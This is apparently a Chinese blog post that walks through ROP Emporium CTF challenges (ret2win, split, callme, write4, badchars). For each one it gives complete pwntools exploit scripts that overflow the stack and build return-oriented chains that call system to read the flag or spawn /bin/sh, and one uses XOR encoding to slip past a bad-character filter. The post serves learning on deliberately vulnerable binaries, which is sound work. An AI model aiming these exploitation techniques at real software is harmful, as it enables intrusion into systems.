<!DOCTYPE html>
<html lang="zh">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s">
     <link rel="shortcut icon" href="/img/favicon.ico">
    <title>
        Hel1antHu5&#39;s Blog
    </title>
    <meta name="description" content="Hello," my is hel1anthu5, enjoy it!>
    <meta name="keywords" content="Blog,Hexo,Theme,刘训灼,LiuXunzhuo">
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-home
 replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            【CTF-PWN】ROPEmporium
        </p>
        <hr>
    </div>
    <div class="post-content">
        <p>记录一下学习ROP的基础题目.</p>
<a id="more"></a>
<hr>
<h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h5 id="32位"><a href="#32位" class="headerlink" title=" 32位:"></a><a href="https://ropemporium.com/binary/ret2win32.zip" target="_blank" rel="noopener"> 32位</a>:</h5><p>先分析一下程序, 可以看到<code>main</code>、<code>pwnme</code>、<code>ret2win</code>函数.<br><code>main</code>函数调用了<code>pwnme</code>函数, <code>pwnme</code>函数里面存在一个<code>gets</code>读取<code>0x32</code>个字节到<code>s</code>变量里面, 但是这个变量只有<code>0x28</code>大小. 也就是<code>0x28</code> + <code>4</code> + <code>retaddr</code>就可以控制这个程序的返回地址了.<br><img src="/images/14/ret2win/1.jpg" alt></p>
<p>废话不多说 直接上exp.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win32"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>
ret2win_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/ret2win/2.jpg" alt></p>
<h5 id="64位"><a href="#64位" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2win.zip" target="_blank" rel="noopener">64位</a>:</h5><p>虽然是<code>64</code>位的, 但是这个题目不需要进行<code>rop</code>, 所以和<code>32</code>位的做法一样.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>   <span class="token comment" spellcheck="true"># because is 64 bit program, +8</span>
ret2win_addr <span class="token operator">=</span> <span class="token number">0x0000000000400811</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/ret2win/3.jpg" alt></p>
<hr>
<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/split32.zip" target="_blank" rel="noopener">32位</a>:</h5><p><code>main</code>、<code>pwnme</code>函数都和上道题差不多, 但是<code>usefulFunction</code>里面只有一条<code>system(&quot;/bin/ls&quot;)</code>, 并不是<code>cat /flag</code>, 不过可以通过<code>IDA</code>里面<code>shift+F12</code>, 搜索到<code>/bin/cat flag.txt</code>, 也就是<code>system</code>函数和<code>/bin/cat flag.txt</code>并不在连续的内存位置, 所以需要构造一下 :D<br><img src="/images/14/split/1.jpg" alt></p>
<p>接下来就要用到汇编中, 调用函数的原理. 如果不懂的可以看我之前拍过的一期视频.<br><a href="https://www.bilibili.com/video/BV1DE411y7nR" target="_blank" rel="noopener">【x86汇编】详解汇编调用函数三步，加恢复堆栈平衡</a></p>
<p>开始写exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0804A030</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/split/2.jpg" alt></p>
<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/split.zip" target="_blank" rel="noopener">64位</a>:</h5><p>64位调用函数参数寄存器: <code>rdi, rsi, rdx, rcx, r8, r9</code><br>从这里开始, 我们第一次接触<code>gadget</code>, 什么是<code>gadget</code>呢, 就是程序中存在的一些小汇编指令,<br>比如<code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>mov r12, 13; ret</code>, 有没有发现什么规律, 每个汇编指令结尾都是<code>ret</code>, 所以是<code>ROP</code> <code>Return-Oriented Programming</code>, 可以通过找到多个<code>gadget</code>, 最后组成一段长的<code>链</code>, 以完成我们的攻击.</p>
<p>在我们安装完毕<code>pwntools</code>之后, 会有一个工具<code>ROPgadget</code>, 它可以很方便的找到我们攻击所需要的<code>gadget</code>.</p>
<p>64位程序调用函数的时候, 函数的前6个参数是存在于寄存器当中的, 所以我们需要把<code>/bin/cat flag.txt</code>放到第一个参数的位置, 也就是需要找到<code>pop rdi; ret</code></p>
<p>找<code>pop rdi; ret</code></p>
<pre class=" language-shell"><code class="language-shell">ROPgadget --binary split --only "pop|ret"</code></pre>
<p>可以找到<code>0x0000000000400883 : pop rdi ; ret</code>, 已经可以开始写exp了.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var </span>
overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>
pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400883</span>
cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/split/3.jpg" alt></p>
<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/callme32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这道题目是为了加深函数调用的理解<br>题目说需要依次调用<code>callme_one(), callme_two() , callme_three()</code>三个函数, 每个函数都需要传递<code>1 2 3</code>三个参数. 也就是<code>func(1, 2, 3)</code></p>
<p>需要通过<code>ROPgadget</code>找到一个可以删除栈上三个参数的<code>gadget</code>, 以恢复栈平衡.</p>
<p>要注意, <code>callme_one, callme_two</code>等函数地址要取<code>函数本身</code>的, 而不是<code>call callme_one</code>之类的地址.</p>
<p>开始写exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>
callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>
callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>
callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token punctuation">]</span>

pop_esi_rdi_rbp_ret <span class="token operator">=</span> <span class="token number">0x080488a9</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/callme/1.jpg" alt></p>
<h5 id="64位-2"><a href="#64位-2" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/callme.zip" target="_blank" rel="noopener">64位</a>:</h5><p>emm, 这个题目, 64位个人感觉要更简单一些, 专心找<code>gadget</code>就可以了.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>
callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>
callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>
callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token punctuation">]</span>

pop_rdi_rsi_rdx_addr <span class="token operator">=</span> <span class="token number">0x0000000000401ab0</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/callme/2.jpg" alt></p>
<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h5 id="32位-3"><a href="#32位-3" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/write432.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这个挑战给了<code>system</code>但是没有给<code>/bin/cat flag.txt</code>, 则需要自己写一段进去, 这里打算直接写个<code>/bin/sh</code>, 但是往哪里写呢？</p>
<p>通过<code>readelf</code>工具查看段.<br><img src="/images/14/write4/1.jpg" alt></p>
<p>可以看到<code>.data</code>和<code>.bss</code>段都有可读写的权限, 这里就可以把<code>/bin/sh</code>写到<code>.data</code>段内, 要写入的长度是7, data段大小是8, 刚好可以装下.</p>
<p>要想写入数据到里面, 需要使用<code>mov</code>指令, 于是找到了</p>
<pre><code>0x080486da : pop edi ; pop ebp ; ret
0x08048670 : mov dword ptr [edi], ebp ; ret</code></pre><p>这两条指令就可以满足我们写入数据到内存的想法.  由于这是32位的程序, 每次只能写入4个字节, 而<code>/bin/sh</code>是7个字节, 于是我们要分两次进行写入。 </p>
<p>那? Go?</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
data_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span>
pop_edi_ebp_addr <span class="token operator">=</span> <span class="token number">0x080486da</span>
mov_edi_ebp <span class="token operator">=</span> <span class="token number">0x08048670</span>
bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>
left_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
right_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> left_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> right_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/write4/2.jpg" alt></p>
<h5 id="64位-3"><a href="#64位-3" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/write4.zip" target="_blank" rel="noopener">64位</a>:</h5><p>思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把<code>/bin/sh</code>写进去, 不用分开写入了.</p>
<p>找到需要的<code>gadget</code></p>
<pre><code>0x0000000000400893 : pop rdi ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400820 : mov qword ptr [r14], r15 ; ret</code></pre><p>开始编写exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400893</span>
data_addr <span class="token operator">=</span> <span class="token number">0x0000000000601050</span>
mov_r14_r15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400820</span>
pop_r14_15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_15_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh_str <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_r14_r15_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/write4/3.jpg" alt></p>
<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h5 id="32位-4"><a href="#32位-4" class="headerlink" title="32位:"></a><a href>32位</a>:</h5><p>程序禁止输入<code>b i c / &lt;space&gt; f n s</code>, 可以通过异或后的结果来把<code>/bin/sh</code>写到程序, 再通过<code>gadget</code>把<code>/bin/sh</code>异或回来, 再进行执行.</p>
<p>首先要得出异或哪个数字可以通过这个黑名单, 写个脚本跑跑.</p>
<pre class=" language-python"><code class="language-python">blackList <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span>  <span class="token string">"s"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>

result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token comment" spellcheck="true"># 测试从1异或到20 看看哪个数字可以使用</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> bin_sh<span class="token punctuation">:</span>
        <span class="token keyword">if</span> ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> i <span class="token keyword">in</span> blackList<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> item
            <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token string">""</span></code></pre>
<p>执行完毕可以发现<code>2 3 5 9 18 19</code>之类的都可以用, 然后直接用个最小的就可以.</p>
<p>开始编写exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>

overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"laaa"</span><span class="token punctuation">)</span>
xor_num <span class="token operator">=</span> <span class="token number">2</span>
bin_sh <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data_addr <span class="token operator">=</span> <span class="token number">0x0804a038</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
mov_edi_esi_ret <span class="token operator">=</span> <span class="token number">0x08048893</span>
pop_esi_edi_ret <span class="token operator">=</span> <span class="token number">0x08048899</span>
pop_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048896</span>
xor_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048890</span>

<span class="token comment" spellcheck="true"># xor encode</span>
<span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bin_sh<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num<span class="token punctuation">)</span>

bin_sh <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
<span class="token comment" spellcheck="true"># write "/bin" to data</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># write "/sh" to data</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># decode xor</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx_ecx_ret<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># system(/bin/sh)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/badchars/1.jpg" alt></p>
